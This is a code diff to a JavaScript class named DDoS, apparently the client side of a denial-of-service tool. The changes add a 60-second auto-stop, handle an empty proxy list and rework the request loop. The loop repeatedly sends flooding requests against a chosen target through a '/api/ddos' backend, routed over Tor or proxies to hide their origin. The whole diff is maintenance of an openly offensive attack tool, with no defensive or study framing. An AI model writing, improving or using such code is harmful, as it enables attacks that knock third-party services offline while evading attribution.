@@ -51,6 +51,7 @@ class DDoS {
   this.running = false;
   this.maxThreads = 100;
   this.target = '';
+  this.attackTimeout = null; // Add attackTimeout property
  }
 
  setupUI() {
@@ -194,12 +195,18 @@ class DDoS {
 
  populateProxyList() {
   this.proxyList.innerHTML = '';
-  this.availableProxies.forEach(proxy => {
+  if (this.availableProxies && this.availableProxies.length > 0) {
+   this.availableProxies.forEach(proxy => {
+    const option = document.createElement('option');
+    option.value = proxy;
+    option.textContent = proxy;
+    this.proxyList.appendChild(option);
+   });
+  } else {
    const option = document.createElement('option');
-   option.value = proxy;
-   option.textContent = proxy;
+   option.textContent = 'No proxies available';
    this.proxyList.appendChild(option);
-  });
+  }
  }
 
  createProxyList() {
@@ -576,34 +583,19 @@ class DDoS {
   this.attackThreads = [];
 
   for (let i = 0; i < this.maxThreads; i++) {
-   const threadPromise = this.sendDDoSRequest(target);
-   this.attackThreads.push(threadPromise);
-   this.activeThreads++;
+   this.sendDDoSRequest(target);
   }
 
-  this.monitorThreads(target);
- }
-
- async monitorThreads(target) {
-  while (this.running) {
-   const finishedThreads = this.attackThreads.filter(promise => promise.isResolved || promise.isRejected);
-
-   for (const finishedThread of finishedThreads) {
-    const index = this.attackThreads.indexOf(finishedThread);
-    if (index > -1) {
-     this.attackThreads.splice(index, 1);
-
-     const newThreadPromise = this.sendDDoSRequest(target);
-     this.attackThreads.push(newThreadPromise);
-    }
-    this.activeThreads = this.attackThreads.length;
-   }
-
-   await new Promise(resolve => setTimeout(resolve, 5000));
-  }
+  // Set a timeout to automatically stop the attack after 60 seconds (adjust as needed)
+  this.attackTimeout = setTimeout(() => {
+   this.stop();
+   this.log('DDoS attack stopped automatically after 60 seconds.');
+  }, 60000);
  }
 
  async sendDDoSRequest(target) {
+  if (!this.running) return; // Stop if the attack is stopped
+
   try {
    const proxy = this.isTorEnabled ? this.torProxy : this.proxyList.value;
    const url = `/api/ddos?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}&rate=${this.requestRate}`;
@@ -621,9 +613,8 @@ class DDoS {
    this.handleAttackError('DDoS', target, err);
   } finally {
    if (this.running) {
-    this.sendDDoSRequest(target);
-   } else {
-    this.activeThreads--;
+    setTimeout(() => this.sendDDoSRequest(target), 1000 / this.requestRate); // Respect request rate
+    this.activeThreads = this.attackThreads.length;
    }
   }
  }
@@ -894,6 +885,12 @@ class DDoS {
   this.packetsSent = 0;
   this.dataSent = 0;
   this.target = '';
+
+  // Clear the attack timeout
+  if (this.attackTimeout) {
+   clearTimeout(this.attackTimeout);
+   this.attackTimeout = null;
+  }
  }
 
  setAttackType(attackType) {
